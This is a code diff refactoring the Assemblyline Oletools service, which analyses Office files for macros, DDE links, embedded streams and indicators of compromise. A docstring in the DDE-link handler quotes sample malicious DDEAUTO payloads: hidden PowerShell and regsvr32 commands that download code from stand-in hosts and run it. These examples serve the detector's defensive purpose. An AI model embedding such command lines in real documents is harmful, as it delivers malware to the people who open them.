@@ -44,10 +44,24 @@ from assemblyline_v4_service.common.extractor.base64 import find_base64
 from assemblyline_v4_service.common.extractor.pe_file import find_pe_files
 from assemblyline_v4_service.common.request import ServiceRequest
 from assemblyline_v4_service.common.result import Result, ResultSection, BODY_FORMAT, Heuristic
-from assemblyline_v4_service.common.task import Task, MaxExtractedExceeded
+from assemblyline_v4_service.common.task import MaxExtractedExceeded
 
 from oletools_.cleaver import OLEDeepParser
 from oletools_.stream_parser import PowerPointDoc
+
+
+def _add_section(result: Result, result_section: Optional[ResultSection]) -> None:
+    """Helper to add optional ResultSections to Results."""
+    # If python 3.7 support is dropped this can be replaced
+    # by using := to get a one-liner instead
+    if result_section:
+        result.add_section(result_section)
+
+def _add_subsection(result_section: ResultSection, subsection: Optional[ResultSection]) -> None:
+    """Helper to add optional ResultSections to ResultSections."""
+    if subsection:
+        result_section.add_subsection(subsection)
+
 
 class Oletools(ServiceBase):
     # OLEtools minimum version supported
@@ -131,18 +145,17 @@ class Oletools(ServiceBase):
     CHR_RE = r'chr[$]?\((\d+)\)'
     CHRW_RE = r'chrw[$]?\((\d+)\)'
 
+
     def __init__(self, config: Optional[Dict] = None) -> None:
-        """Creates an instance of the Oletools service
+        """Creates an instance of the Oletools service.
 
         Args:
-            config: service configuration (defaults to the configuration in the service manifest)
+            config: service configuration (defaults to the configuration in the service manifest).
         """
         super().__init__(config)
         self._oletools_version = ''
         self.request: Optional[ServiceRequest] = None
-        self.task: Optional[Task] = None
         self.sha = ''
-        self.ole_result: Optional[Result] = None
 
         self.word_chains: Dict[str, Set[str]] = {}
         self.macro_skip_words: Set[str] = set()
@@ -163,10 +176,10 @@ class Oletools(ServiceBase):
         self.extracted_clsids: Set[str] = set()
         self.excess_extracted: int = 0
         self.vba_stomping = False
-        self.scored_macro_uri = False
+
 
     def start(self) -> None:
-        """ Initializes the service """
+        """Initializes the service."""
         self.log.debug("Service started")
 
         from oletools.olevba import __version__ as olevba_version
@@ -194,18 +207,17 @@ class Oletools(ServiceBase):
                                  'responsebody', 'opentextfile', 'resume', 'open', 'environment', 'write', 'close',
                                  'error', 'else', 'number', 'chr', 'sub', 'loop'}
 
+
     def get_tool_version(self) -> str:
-        """ Returns the version of oletools used by the service """
+        """Returns the version of oletools used by the service."""
         return self._oletools_version
+
 
     def execute(self, request: ServiceRequest) -> None:
         """Main Module. See README for details."""
-        self.task = request.task
         request.result = Result()
-        self.ole_result = request.result
         self.request = request
         self.sha = request.sha256
-        self.scored_macro_uri = False
         self.extracted_clsids = set()
 
         self.macros = []
@@ -220,31 +232,33 @@ class Oletools(ServiceBase):
             self.pat_safelist = self.URI_SAFELIST + self.ioc_pattern_safelist
             self.tag_safelist = self.TAG_SAFELIST + self.ioc_exact_safelist
 
-        path = request.file_path
         file_contents = request.file_contents
+        path = request.file_path
+        result = request.result
 
         try:
-            self._check_for_indicators(path)
-            self._check_for_dde_links(path)
-            self._rip_mhtml(file_contents)
-            self._extract_streams(path)
-            self._extract_rtf(file_contents)
-            self._check_for_macros(path, request.sha256)
-            self._create_macro_sections(request.sha256)
-            self._check_xml_strings(path)
+            _add_section(result, self._check_for_indicators(path))
+            _add_section(result, self._check_for_dde_links(path))
+            if request.task.file_type == 'document/office/mhtml':
+                _add_section(result, self._rip_mhtml(file_contents))
+            self._extract_streams(path, result, request.deep_scan)
+            _add_section(result, self._extract_rtf(file_contents))
+            _add_section(result, self._check_for_macros(path, request.sha256))
+            _add_section(result, self._create_macro_sections(request.sha256))
+            self._check_xml_strings(path, result, request.deep_scan)
         except Exception as e:
             self.log.error(f"We have encountered a critical error for sample {self.sha}: {str(e)}")
 
         if request.deep_scan:
             # Proceed with OLE Deep extraction
-            parser = OLEDeepParser(path, request.result, self.log, request.task)
+            parser = OLEDeepParser(path, result, self.log, request.task)
             # noinspection PyBroadException
             try:
                 parser.run()
             except Exception as e:
                 self.log.error("Error while deep parsing {path}: {str(e)}")
                 section = ResultSection("Error deep parsing: {str(e)}")
-                request.result.add_section(section)
+                result.add_section(section)
 
         if self.excess_extracted:
             self.log.error(f"Too many files extracted for sample {self.sha}."
@@ -252,11 +266,14 @@ class Oletools(ServiceBase):
         request.set_service_context(self.get_tool_version())
 
 
-    def _check_for_indicators(self, filename: str) -> None:
+    def _check_for_indicators(self, filename: str) -> Optional[ResultSection]:
         """Finds and reports on indicator objects typically present in malicious files.
 
         Args:
             filename: Path to original OLE sample.
+
+        Returns:
+            A result section with the indicators if any were found.
         """
         # noinspection PyBroadException
         try:
@@ -276,20 +293,25 @@ class Oletools(ServiceBase):
                         section.add_line(f'{indicator.name}: {indicator.value}'
                                        + (f', {indicator.description}' if indicator.description else ''))
                     else:
+                        assert section.heuristic
                         section.heuristic.add_signature_id(indicator.name)
                         section.add_line(f'{indicator.name} ({indicator.value}): {indicator.description}')
 
             if section.body:
-                self.ole_result.add_section(section)
+                return section
         except Exception:
             self.log.debug(f"OleID analysis failed for sample {self.sha}")
+        return None
 
 
-    def _check_for_dde_links(self, filepath: str) -> None:
+    def _check_for_dde_links(self, filepath: str) -> Optional[ResultSection]:
         """Use msodde in OLETools to report on DDE links in document.
 
         Args:
             filepath: Path to original sample.
+
+        Returns:
+            A section with the dde links if any are found.
         """
         # noinspection PyBroadException
         try:
@@ -300,25 +322,29 @@ class Oletools(ServiceBase):
             logging.getLogger().handlers = []
 
             links_text = links_text.strip()
-            if not links_text:
-                return
-            self._process_dde_links(links_text, self.ole_result)
+            if links_text:
+                return self._process_dde_links(links_text)
 
         # Unicode and other errors common for msodde when parsing samples, do not log under warning
         except Exception as e:
             self.log.debug(f"msodde parsing for sample {self.sha} failed: {str(e)}")
+        return None
 
-    def _process_dde_links(self, links_text: str, ole_result: Result) -> None:
+
+    def _process_dde_links(self, links_text: str) -> Optional[ResultSection]:
         """Examine DDE links and report on malicious characteristics.
 
         Args:
             links_text: DDE link text.
             ole_section: OLE AL result.
+
+        Returns:
+            A section with dde links if any are found.
         """
         ddeout_name = f'{self.sha}.ddelinks.original'
         self._extract_file(links_text.encode(), ddeout_name, "Original DDE Links")
 
-        """ typical results look like this:
+        ''' typical results look like this:
         DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell
         \\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden -C $e=(new-object system.net.webclient).downloadstring
         ('http://bad.ly/Short');powershell.exe -e $e # " "Legit.docx"
@@ -327,7 +353,7 @@ class Oletools(ServiceBase):
         -Command $e"
         DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe"
         "/c regsvr32 /u /n /s /i:\"h\"t\"t\"p://downloads.bad.com/file scrobj.dll" "For Security Reasons"
-        """
+        '''
 
         # To date haven't seen a sample with multiple links yet but it should be possible..
         dde_section = ResultSection("MSO DDE Links:", body_format=BODY_FORMAT.MEMORY_DUMP)
@@ -358,17 +384,19 @@ class Oletools(ServiceBase):
                 dde_section.add_tag('file.ole.dde_link', link_text)
         if dde_extracted:
             dde_section.set_heuristic(16 if looksbad else 15)
-            ole_result.add_section(dde_section)
+            return dde_section
+        return None
 
 
-    def _rip_mhtml(self, data: bytes) -> None:
-        """Parses and extracts ActiveMime Document(document/office/mhtml).
+    def _rip_mhtml(self, data: bytes) -> Optional[ResultSection]:
+        """Parses and extracts ActiveMime Document (document/office/mhtml).
 
         Args:
             data: MHTML data.
+
+        Returns:
+            A result section with the extracted activemime filenames if any are found.
         """
-        if self.task.file_type != 'document/office/mhtml':
-            return
         mime_res = ResultSection("ActiveMime Document(s) in multipart/related", heuristic=Heuristic(26))
         mhtml = email.message_from_bytes(data)
         # find all the attached files:
@@ -385,25 +413,26 @@ class Oletools(ServiceBase):
                     except Exception as e:
                         self.log.debug(f"Could not decompress ActiveMime part for sample {self.sha}: {str(e)}")
 
-        if mime_res.body:
-            self.ole_result.add_section(mime_res)
+        return mime_res if mime_res.body else None
 
 #-- Ole Streams --
 
     # noinspection PyBroadException
-    def _extract_streams(self, file_name: str) -> None:
+    def _extract_streams(self, file_name: str, result: Result,
+                         extract_all: bool = False) -> None:
         """Extracts OLE streams and reports on metadata and suspicious properties.
 
         Args:
             file_name: Path to original sample.
-            file_contents: Original sample file content.
+            result: Top level result for adding stream result sections.
+            extract_all: Whether to extract all streams.
         """
         try:
             # Streams in the submitted ole file
             with open(file_name, 'rb') as olef:
-                ole_res = self._process_ole_file(self.sha, olef)
+                ole_res = self._process_ole_file(self.sha, olef, extract_all)
             if ole_res is not None:
-                self.ole_result.add_section(ole_res)
+                result.add_section(ole_res)
 
             if not zipfile.is_zipfile(file_name):
                 return # File is not ODF
@@ -415,44 +444,42 @@ class Oletools(ServiceBase):
             with zipfile.ZipFile(file_name) as z:
                 for f_name in z.namelist():
                     with z.open(f_name) as f:
-                        ole_stream_res = self._process_ole_file(f_name, f)
-                        if ole_stream_res is not None:
-                            subdoc_res.add_subsection(ole_stream_res)
+                        _add_subsection(subdoc_res, self._process_ole_file(f_name, f, extract_all))
 
             if subdoc_res.heuristic or subdoc_res.subsections:
-                self.ole_result.add_section(subdoc_res)
+                result.add_section(subdoc_res)
         except Exception:
             self.log.warning(f"Error extracting streams for sample {self.sha}: {traceback.format_exc(limit=2)}")
 
-    def _process_ole_file(self, name: str, ole_file: IO[bytes]) -> Optional[ResultSection]:
+
+    def _process_ole_file(self, name: str, ole_file: IO[bytes],
+                          extract_all: bool = False) -> Optional[ResultSection]:
         """Parses OLE data and reports on metadata and suspicious properties.
 
         Args:
-            name: ole document name
-            ole: path to ole file
+            name: The ole document name.
+            ole_file: The path to the ole file.
+            extract_all: Whether to extract all streams.
 
         Returns:
-            A result section if there are results to be reported
+            A result section if there are results to be reported.
         """
         if not olefile.isOleFile(ole_file):
             return None
 
         ole = olefile.OleFileIO(ole_file)
+        if ole.direntries is None:
+            return None
 
         streams_section = ResultSection(f"OLE Document {name}")
-        meta_sec = self._process_ole_metadata(ole.get_metadata())
-        if meta_sec is not None:
-            streams_section.add_subsection(meta_sec)
-
-        clsid_sec = self._process_ole_clsid(ole)
-        if clsid_sec is not None:
-            streams_section.add_subsection(clsid_sec)
+        _add_subsection(streams_section, self._process_ole_metadata(ole.get_metadata()))
+        _add_subsection(streams_section, self._process_ole_clsid(ole))
 
         decompress = any("\x05HwpSummaryInformation" in dir_entry for dir_entry in ole.listdir())
         decompress_macros: List[bytes] = []
 
         exstr_sec = None
-        if self.request.deep_scan:
+        if extract_all:
             exstr_sec = ResultSection("Extracted Ole streams:", body_format=BODY_FORMAT.MEMORY_DUMP)
         ole10_res = False
         ole10_sec = ResultSection("Extracted Ole10Native streams:", body_format=BODY_FORMAT.MEMORY_DUMP,
@@ -533,7 +560,7 @@ class Oletools(ServiceBase):
 
                 # Finally look for other IOC patterns, will ignore SRP streams for now
                 if not re.match(r'__SRP_[0-9]*', stream):
-                    iocs, extract_stream = self._check_for_patterns(data)
+                    iocs, extract_stream = self._check_for_patterns(data, extract_all)
                     if iocs:
                         sus_sec.add_line(f"IOCs in {stream}:")
                         sus_res = True
@@ -551,8 +578,8 @@ class Oletools(ServiceBase):
                     sus_sec.add_subsection(ole_b64_res)
 
                 # All streams are extracted with deep scan
-                if extract_stream or swf_sec.body or hex_sec.body or self.request.deep_scan:
-                    if self.request.deep_scan:
+                if extract_stream or swf_sec.body or hex_sec.body or extract_all:
+                    if exstr_sec:
                         exstr_sec.add_line(f"Stream Name:{stream}, SHA256: {stm_sha}")
                     self._extract_file(data, f'{stm_sha}.ole_stream', f"Embedded OLE Stream {stream}")
                     if decompress and (stream.endswith(".ps") or stream.startswith("Scripts/") or stream.endswith(".eps")):
@@ -573,6 +600,7 @@ class Oletools(ServiceBase):
         if hex_sec.body:
             streams_section.add_subsection(hex_sec)
         if sus_res:
+            assert sus_sec.heuristic
             sus_sec.heuristic.increment_frequency(sum(len(tags) for tags in sus_sec.tags.values()))
             streams_section.add_subsection(sus_sec)
 
@@ -586,14 +614,15 @@ class Oletools(ServiceBase):
 
         return streams_section
 
+
     def _process_ole_metadata(self, meta: olefile.OleMetadata) -> Optional[ResultSection]:
-        """ Create sections for ole metadata
+        """Create sections for ole metadata.
 
         Args:
-            meta: ole metadata
+            meta: the ole metadata.
 
         Returns:
-            A result section with metadata info if any metadata was found
+            A result section with metadata info if any metadata was found.
         """
         meta_sec = ResultSection("OLE Metadata:")
         meta_sec_json_body = dict()
@@ -626,13 +655,14 @@ class Oletools(ServiceBase):
             return meta_sec
         return None
 
+
     def _process_ole_clsid(self, ole: olefile.OleFileIO) -> Optional[ResultSection]:
-        """ Create section for ole clsids
+        """Create section for ole clsids.
 
         Args:
-            ole: the olefile
+            ole: The olefile.
         Returns:
-            A result section with the clsid of the file if it can be identified
+            A result section with the clsid of the file if it can be identified.
         """
         clsid_sec_json_body = dict()
         clsid_sec = ResultSection("CLSID:")
@@ -653,16 +683,17 @@ class Oletools(ServiceBase):
         clsid_sec.body = json.dumps(clsid_sec_json_body)
         return clsid_sec
 
+
     def _process_ole10native(self, stream_name: str, data: bytes, streams_section: ResultSection) -> bool:
-        """
-        Parses ole10native data and reports on suspicious content.
+        """Parses ole10native data and reports on suspicious content.
 
         Args:
             stream_name: Name of OLE stream.
             data: Ole10native data.
             streams_section: Ole10Native result section (must have heuristic set).
 
-        Returns: if suspicious content is found
+        Returns:
+            If suspicious content is found
         """
         assert streams_section.heuristic
 
@@ -714,6 +745,7 @@ class Oletools(ServiceBase):
 
         return True
 
+
     def _process_powerpoint_stream(self, data: bytes, streams_section: ResultSection) -> bool:
         """Parses powerpoint stream data and reports on suspicious characteristics.
 
@@ -721,7 +753,8 @@ class Oletools(ServiceBase):
             data: Powerpoint stream data.
             streams_section: Streams AL result section.
 
-        Returns: if successful
+        Returns:
+           If processing was successful
         """
         try:
             powerpoint = PowerPointDoc(data)
@@ -733,7 +766,7 @@ class Oletools(ServiceBase):
                     if obj.error is not None:
                         streams_section.add_line("\tError parsing ExOleObjStg stream. This is suspicious.")
                         if streams_section.heuristic:
-                            streams_section.heurstic.increment_frequency()
+                            streams_section.heuristic.increment_frequency()
                         else:
                             streams_section.set_heuristic(28)
                         continue
@@ -777,6 +810,7 @@ class Oletools(ServiceBase):
             self._extract_file(swf, f'{swf_md5}.swf', "Flash file extracted during sample analysis")
             swf_found = True
         return swf_found
+
 
     @staticmethod
     def _verifySWF(f: IO[bytes], x: int) -> Optional[bytes]:
@@ -844,11 +878,14 @@ class Oletools(ServiceBase):
 
 #-- RTF objects --
 
-    def _extract_rtf(self, file_contents: bytes) -> None:
-        """ Handle RTF Packages
+    def _extract_rtf(self, file_contents: bytes) -> Optional[ResultSection]:
+        """Handle RTF Packages.
 
         Args:
-            file_contents: contents of the submission
+            file_contents: Contents of the submission
+
+        Returns:
+            A result section if any rtf results were found.
         """
         streams_res = ResultSection("RTF objects")
         sep = "-----------------------------------------"
@@ -970,9 +1007,11 @@ class Oletools(ServiceBase):
                 streams_res.add_subsection(unk_sec)
 
             if streams_res.body or streams_res.subsections:
-                self.ole_result.add_section(streams_res)
+                return streams_res
         except Exception:
             self.log.warning(f"Failed to process RTF objects for sample {self.sha}: {traceback.format_exc()}")
+        return None
+
 
     @staticmethod
     def _sanitize_filename(filename: str, replacement: str = '_', max_length: int = 200) -> str:
@@ -1007,17 +1046,33 @@ class Oletools(ServiceBase):
 
 #-- Macros --
 
-    def _check_for_macros(self, filename: str, request_hash: str) -> None:
+    def _check_for_macros(self, filename: str, request_hash: str) -> Optional[ResultSection]:
         """Use VBA_Parser in Oletools to extract VBA content from sample.
 
         Args:
             filename: Path to original sample.
             file_contents: Original sample file content.
             request_hash: Original submitted sample's sha256hash.
+
+        Returns: A result section with the error condition if macros couldn't be analyzed
         """
         # noinspection PyBroadException
         try:
             vba_parser = VBA_Parser(filename)
+
+            # Get P-code
+            try:
+                if vba_parser.detect_vba_stomping():
+                    self.vba_stomping = True
+                pcode: str = vba_parser.extract_pcode() # type: ignore
+                # remove header
+                pcode_l = pcode.split('\n',2)
+                if len(pcode_l) == 3:
+                    self.pcode.append(pcode_l[2])
+            except Exception as e:
+                self.log.debug(f"pcodedmp.py failed to analyze pcode for sample {self.sha}. Reason: {str(e)}")
+
+            # Get Macros
             try:
                 if vba_parser.detect_vba_macros():
                     # noinspection PyBroadException
@@ -1025,6 +1080,7 @@ class Oletools(ServiceBase):
                         for (subfilename, stream_path, vba_filename, vba_code) in vba_parser.extract_macros():
                             if stream_path == 'VBA P-code':
                                 continue
+                            assert isinstance(vba_code, str)
                             if vba_code.strip() == '':
                                 continue
                             vba_code_sha256 = hashlib.sha256(str(vba_code).encode()).hexdigest()
@@ -1037,37 +1093,25 @@ class Oletools(ServiceBase):
                                        f"{traceback.format_exc()}")
                         section = ResultSection("OleVBA : Error extracting macros")
                         section.add_tag('technique.macro', "Contains VBA Macro(s)")
-                        self.ole_result.add_section(section)
+                        return section
 
             except Exception as e:
                 self.log.debug(f"OleVBA VBA_Parser.detect_vba_macros failed for sample {self.sha}: {str(e)}")
                 section = ResultSection(f"OleVBA : Error parsing macros: {str(e)}")
-                self.ole_result.add_section(section)
-
-            # Get P-code
-            try:
-                if vba_parser:
-                    if vba_parser.detect_vba_stomping():
-                        self.vba_stomping = True
-                    # type checker is confused because the return is bytes in python2
-                    pcode: str = vba_parser.extract_pcode()
-                    # remove header
-                    pcode_l = pcode.split('\n',2)
-                    if len(pcode_l) == 3:
-                        self.pcode.append(pcode_l[2])
-            except Exception as e:
-                self.log.debug(f"pcodedmp.py failed to analyze pcode for sample {self.sha}. Reason: {str(e)}")
+                return section
 
         except Exception:
             self.log.debug(f"OleVBA VBA_Parser constructor failed for sample {self.sha}, "
                            f"may not be a supported OLE document")
 
-    def _create_macro_sections(self, request_hash: str) -> None:
-        """ Creates result section for embedded macros of sample. Also extracts all macros and pcode content to
-        individual files (all_vba_[hash].vba and all_pcode_[hash].data).
+
+    def _create_macro_sections(self, request_hash: str) -> Optional[ResultSection]:
+        """ Creates result section for embedded macros of sample.
+
+        Also extracts all macros and pcode content to individual files (all_vba_[hash].vba and all_pcode_[hash].data).
 
         Args:
-            request_hash: Original submitted sample's sha256hash.
+            Request_hash: Original submitted sample's sha256hash.
         """
         macro_section = ResultSection("OleVBA : Macros detected")
         macro_section.add_tag('technique.macro', "Contains VBA Macro(s)")
@@ -1090,6 +1134,7 @@ class Oletools(ServiceBase):
                                               parent=macro_section,
                                               body='\n'.join(auto_exec))
                 for keyword in auto_exec:
+                    assert autoexecution.heuristic
                     autoexecution.heuristic.add_signature_id(keyword)
             if suspicious:
                 signatures = {keyword: 1 for keyword in suspicious
@@ -1099,6 +1144,7 @@ class Oletools(ServiceBase):
                                                            heuristic=heuristic,
                                                            body='\n'.join(suspicious)))
             if network:
+                assert network_section.heuristic
                 if network_section.heuristic.frequency == 0:
                     network_section.heuristic = None
                 network_section.add_line('\n'.join(network))
@@ -1117,6 +1163,7 @@ class Oletools(ServiceBase):
                     stomp_sec.add_subsection(ResultSection("Suspicious content in pcode dump not found in macro dump:",
                                                            body=pcode_results))
                     stomp_sec.add_line("Suspicious VBA content different in pcode dump than in macro dump content.")
+                    assert stomp_sec.heuristic
                     stomp_sec.heuristic.add_signature_id("Suspicious VBA stomped", score=500)
                     vba_stomp_sec = ResultSection("Suspicious content in macro dump:", parent=stomp_sec)
                     vba_stomp_sec.add_lines(vba_matches)
@@ -1129,8 +1176,8 @@ class Oletools(ServiceBase):
                            f"{traceback.format_exc()}")
             section = ResultSection(f"OleVBA : Error parsing macros: {str(e)}")
             macro_section.add_subsection(section)
-        if macro_section.subsections:
-            self.ole_result.add_section(macro_section)
+        return macro_section if macro_section.subsections else None
+
 
     # TODO: may want to eventually pull this out into a Deobfuscation helper that supports multi-languages
     def _deobfuscator(self, text: str) -> str:
@@ -1140,7 +1187,7 @@ class Oletools(ServiceBase):
             text: Original VBA code.
 
         Returns:
-           Original text, or deobfuscated text if specified techniques are detected.
+            Original text, or deobfuscated text if specified techniques are detected.
         """
         deobf = text
         # noinspection PyBroadException
@@ -1228,9 +1275,10 @@ class Oletools(ServiceBase):
         """Build an AL result section for Macro (VBA code) content.
 
         Args:
-            macros: list of VBA codes for building result sections.
+            macros: List of VBA codes for building result sections.
 
-        Returns: section with macro results
+        Returns:
+            Section with macro results.
         """
         vba_code_sha256 = hashlib.sha256(vba_code.encode()).hexdigest()
         macro_section = ResultSection(f"Macro SHA256 : {vba_code_sha256}")
@@ -1257,14 +1305,17 @@ class Oletools(ServiceBase):
         return dump_subsection
 
     def _flag_macro(self, macro_text: str) -> bool:
-        """Determine proportion of randomized text in macro using chains.json. chains.json contains English trigraphs.
-        We score macros on how commonly these trigraphs appear in code, skipping over some common keywords.
+        """Flag macros with obfuscated variable names
+
+        We score macros based on the proportion of English trigraphs in the code,
+        skipping over some common keywords.
 
         Args:
             macro_text: Macro string content.
 
         Returns:
-            True if the score is lower than self.macro_score_min_alert (indicating macro is possibly malicious).
+            True if the score is lower than self.macro_score_min_alert
+            (indicating macro is possibly malicious).
         """
 
         if self.macro_score_max_size is not None and len(macro_text) > self.macro_score_max_size:
@@ -1305,12 +1356,13 @@ class Oletools(ServiceBase):
 
         Args:
             text: Original VBA code.
-            autoexecution: set for adding autoexecution strings
-            suspicious: set for adding suspicious strings
-            network: set for adding host/network strings
-            network_section: section for tagging network results
+            autoexecution: Set for adding autoexecution strings
+            suspicious: Set for adding suspicious strings
+            network: Set for adding host/network strings
+            network_section: Section for tagging network results
+
         Returns:
-            Whether interesting results were found
+            Whether interesting results were found.
         """
         try:
             vba_scanner = VBA_Scanner(text)
@@ -1321,33 +1373,38 @@ class Oletools(ServiceBase):
                     # play nice with detect_suspicious from olevba.py
                     suspicious.add(string.lower())
 
-            for keyword, description in vba_scanner.autoexec_keywords:
-                autoexecution.add(keyword.lower())
+            if vba_scanner.autoexec_keywords is not None:
+                for keyword, description in vba_scanner.autoexec_keywords:
+                    autoexecution.add(keyword.lower())
 
-            for keyword, description in vba_scanner.suspicious_keywords:
-                suspicious.add(keyword.lower())
+            if vba_scanner.suspicious_keywords is not None:
+                for keyword, description in vba_scanner.suspicious_keywords:
+                    suspicious.add(keyword.lower())
 
+            assert network_section.heuristic
+            assert network_section.heuristic.frequency is not None
             freq = network_section.heuristic.frequency
-            for keyword, description in vba_scanner.iocs:
-                # olevba seems to have swapped the keyword for description during iocs extraction
-                # this holds true until at least version 0.27
-                if isinstance(description, str):
-                    description = description.encode('utf-8', errors='ignore')
+            if vba_scanner.iocs is not None:
+                for keyword, description in vba_scanner.iocs:
+                    # olevba seems to have swapped the keyword for description during iocs extraction
+                    # this holds true until at least version 0.27
+                    if isinstance(description, str):
+                        description = description.encode('utf-8', errors='ignore')
 
-                desc_ip = re.match(self.IP_RE, description)
-                puri, duri, tags = self.parse_uri(description)
-                if puri:
-                    network.add(f"{keyword}: {safe_str(duri)}")
-                    network_section.heuristic.increment_frequency()
-                elif desc_ip:
-                    ip_str = safe_str(desc_ip.group(1))
-                    if not is_ip_reserved(ip_str):
+                    desc_ip = re.match(self.IP_RE, description)
+                    puri, duri, tags = self.parse_uri(description)
+                    if puri:
+                        network.add(f"{keyword}: {safe_str(duri)}")
                         network_section.heuristic.increment_frequency()
-                        network_section.add_tag('network.static.ip', ip_str)
-                else:
-                    network.add(f"{keyword}: {safe_str(description)}")
-                for tag in tags:
-                    network_section.add_tag(tag[0], tag[1])
+                    elif desc_ip:
+                        ip_str = safe_str(desc_ip.group(1))
+                        if not is_ip_reserved(ip_str):
+                            network_section.heuristic.increment_frequency()
+                            network_section.add_tag('network.static.ip', ip_str)
+                    else:
+                        network.add(f"{keyword}: {safe_str(description)}")
+                    for tag in tags:
+                        network_section.add_tag(tag[0], tag[1])
 
             return bool(vba_scanner.autoexec_keywords
                         or vba_scanner.suspicious_keywords
@@ -1361,11 +1418,13 @@ class Oletools(ServiceBase):
                       request_hash: str) -> Tuple[bool, List[str]]:
         """ Extract macros and analyze with MacroRaptor
 
-        macros: list of macros to check
-        filename: filename for extracted file
-        description: description for extracted file
+        Args:
+            macros: List of macros to check
+            filename: Filename for extracted file
+            description: Description for extracted file
 
-        Returns: MacroRaptor scan of the macros
+        Returns:
+            MacroRaptor scan of the macros
         """
         combined = '\n'.join(macros)
         if combined:
@@ -1374,6 +1433,7 @@ class Oletools(ServiceBase):
             if combined_sha256 != request_hash:
                 self._extract_file(data, f"{filename}_{combined_sha256[:15]}.data", description)
 
+        assert self.request
         passwords = re.findall('PasswordDocument:="([^"]+)"', combined)
         if 'passwords' in self.request.temp_submission_data:
             self.request.temp_submission_data['passwords'].extend(passwords)
@@ -1385,13 +1445,16 @@ class Oletools(ServiceBase):
 
 #-- XML --
 
-    def _check_xml_strings(self, path: str) -> None:
+    def _check_xml_strings(self, path: str, result: Result, include_fpos: bool = False) -> None:
         """Search xml content for external targets, indicators, and base64 content.
 
         Args:
             path: Path to original sample.
+            result: Result sections are added to this result.
+            include_fpos: Whether to include possible false positives in results.
         """
         xml_target_res = ResultSection("External Relationship Targets in XML", heuristic=Heuristic(1))
+        assert xml_target_res.heuristic # helps typecheckers
         xml_ioc_res = ResultSection("IOCs content:", heuristic=Heuristic(7, frequency=0))
         xml_b64_res = ResultSection("Base64 content:")
         xml_big_res = ResultSection("Files too large to be fully scanned", heuristic=Heuristic(3, frequency=0))
@@ -1423,6 +1486,7 @@ class Oletools(ServiceBase):
                     if len(data) > self.MAX_XML_SCAN_CHARS:
                         data = data[:self.MAX_XML_SCAN_CHARS]
                         xml_big_res.add_line(f'{f}')
+                        assert xml_big_res.heuristic
                         xml_big_res.heuristic.increment_frequency()
 
                     external_links.extend(has_external)
@@ -1431,7 +1495,7 @@ class Oletools(ServiceBase):
                     extract_regex = bool(has_external or has_dde or has_script)
 
                     # Check for IOC and b64 data in XML
-                    iocs, extract_ioc = self._check_for_patterns(data)
+                    iocs, extract_ioc = self._check_for_patterns(data, include_fpos)
                     if iocs:
                         for tag_type, tags in iocs.items():
                             for tag in tags:
@@ -1473,25 +1537,26 @@ class Oletools(ServiceBase):
 
 
         if external_links:
-            self.ole_result.add_section(xml_target_res)
+            result.add_section(xml_target_res)
         if xml_big_res.body:
-            self.ole_result.add_section(xml_big_res)
+            result.add_section(xml_big_res)
         if xml_ioc_res.tags:
             for tag_type, res_tags in xml_ioc_res.tags.items():
                 for res_tag in res_tags:
                     xml_ioc_res.add_line(f"Found the {tag_type.rsplit('.',1)[-1].upper()} string {res_tag} in:")
                     xml_ioc_res.add_lines(ioc_files[tag_type+res_tag])
                     xml_ioc_res.add_line('')
+                    assert xml_ioc_res
                     xml_ioc_res.heuristic.increment_frequency()
-            self.ole_result.add_section(xml_ioc_res)
+            result.add_section(xml_ioc_res)
         if xml_b64_res.subsections:
-            self.ole_result.add_section(xml_b64_res)
+            result.add_section(xml_b64_res)
 
     @staticmethod
     def _find_external_links(parsed: etree.ElementBase) -> List[Tuple[bytes, bytes]]:
         return [
             (relationship.attrib['Type'].rsplit('/',1)[1].encode(), relationship.attrib['Target'].encode())
-            for relationship in parsed.findall(OOXML_RELATIONSHIP_TAG)
+            for relationship in parsed.findall(OOXML_RELATIONSHIP_TAG) # type: ignore
                 if 'Target' in relationship.attrib
                     and 'Type' in relationship.attrib
                     and 'TargetMode' in relationship.attrib
@@ -1501,11 +1566,16 @@ class Oletools(ServiceBase):
 #-- Helper methods --
 
     def _extract_file(self, data: bytes, file_name: str, description: str) -> None:
-        """
-        Adds data as an extracted file
+        """Adds data as an extracted file.
 
-        Checks that there the service hasn't hit the extraction limit before extracting
+        Checks that there the service hasn't hit the extraction limit before extracting.
+
+        Args:
+            data: The data to extract.
+            file_name: File name that will be written to.
+            description: A description of the data.
         """
+        assert self.request
         if self.excess_extracted:
             self.excess_extracted += 1
         else:
@@ -1522,11 +1592,12 @@ class Oletools(ServiceBase):
             except Exception:
                 self.log.error(f"Error extracting {file_name} for sample {self.sha}: {traceback.format_exc(limit=2)}")
 
-    def _check_for_patterns(self, data: bytes) -> Tuple[Mapping[str, Set[bytes]], bool]:
+    def _check_for_patterns(self, data: bytes, include_fpos: bool = False) -> Tuple[Mapping[str, Set[bytes]], bool]:
         """Use FrankenStrings module to find strings of interest.
 
         Args:
-            data: Data to be searched.
+            data: The data to be searched.
+            include_fpos: Whether to include possible false positives.
 
         Returns:
             Dictionary of strings found by type and whether entity should be extracted (boolean).
@@ -1543,23 +1614,24 @@ class Oletools(ServiceBase):
                         or ioc.lower() in self.tag_safelist:
                     continue
                 # Skip .bin files that are common in normal excel files
-                if not self.request.deep_scan and \
+                if not include_fpos and \
                         tag_type == 'file.name.extracted' and re.match(self.EXCEL_BIN_RE, ioc):
                     continue
-                extract = extract or self._decide_extract(tag_type, ioc)
+                extract = extract or self._decide_extract(tag_type, ioc, include_fpos)
                 found_tags[tag_type].add(ioc)
 
         return dict(found_tags), extract
 
-    def _decide_extract(self, ty: str, val: bytes) -> bool:
+    def _decide_extract(self, ty: str, val: bytes, basic_only: bool = False) -> bool:
         """Determine if entity should be extracted by filtering for highly suspicious strings.
 
         Args:
             ty: IOC type.
             val: IOC value (as bytes).
+            basic_only: If set to true only basic checks are done
 
         Returns:
-            Boolean value.
+            Whether the string is suspicious enough to trigger extraction.
         """
         if ty == 'file.name.extracted':
             if val.startswith(b'oleObject'):
@@ -1572,7 +1644,7 @@ class Oletools(ServiceBase):
                 return False
 
         # When deepscanning, do only minimal whitelisting
-        if self.request.deep_scan:
+        if basic_only:
             return True
 
         # common false positives
@@ -1590,7 +1662,7 @@ class Oletools(ServiceBase):
         """Search and decode base64 strings in sample data.
 
         Args:
-            data: Data to be searched.
